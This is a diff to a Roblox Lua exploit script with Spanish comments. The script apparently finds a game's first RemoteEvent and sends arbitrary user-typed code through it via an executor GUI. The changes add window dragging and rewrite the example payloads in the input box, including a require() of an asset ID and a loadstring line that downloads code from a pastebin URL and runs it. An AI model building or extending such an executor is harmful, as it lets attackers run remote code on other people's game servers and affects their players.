@@ -1,6 +1,7 @@
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
 local Workspace = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
 
 -- Encuentra el primer RemoteEvent
 local remote = nil
@@ -27,6 +28,8 @@ local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 500, 0, 300)
 frame.Position = UDim2.new(0.3, 0, 0.3, 0)
 frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+frame.Active = true
+frame.Draggable = false
 frame.Parent = gui
 
 local title = Instance.new("TextLabel")
@@ -43,10 +46,10 @@ local inputBox = Instance.new("TextBox")
 inputBox.Size = UDim2.new(1, -20, 0, 140)
 inputBox.Position = UDim2.new(0, 10, 0, 50)
 inputBox.Text = [[
--- Ejemplos que puedes probar:
--- require(12345678)
--- loadstring(game:HttpGet("https://pastebin.com/raw/..."))()
--- Instance.new("Part", workspace)
+-- Escribe código para enviar al RemoteEvent
+-- Ej: require(12345678)
+-- Ej: loadstring(game:HttpGet("https://pastebin.com/raw/abc123"))()
+-- Ej: Instance.new("Part", workspace).Name = "Test"
 ]]
 inputBox.ClearTextOnFocus = true
 inputBox.MultiLine = true
@@ -125,4 +128,44 @@ end
 executeButton.MouseButton1Click:Connect(sendPayload)
 closeButton.MouseButton1Click:Connect(function()
 	gui:Destroy()
+end)
+
+-- 🖱️ Hacer que se pueda arrastrar la ventana usando el título
+local dragging = false
+local dragInput, dragStart, startPos
+
+local function update(input)
+	local delta = input.Position - dragStart
+	frame.Position = UDim2.new(
+		startPos.X.Scale,
+		startPos.X.Offset + delta.X,
+		startPos.Y.Scale,
+		startPos.Y.Offset + delta.Y
+	)
+end
+
+title.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = frame.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+title.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement then
+		dragInput = input
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		update(input)
+	end
 end)
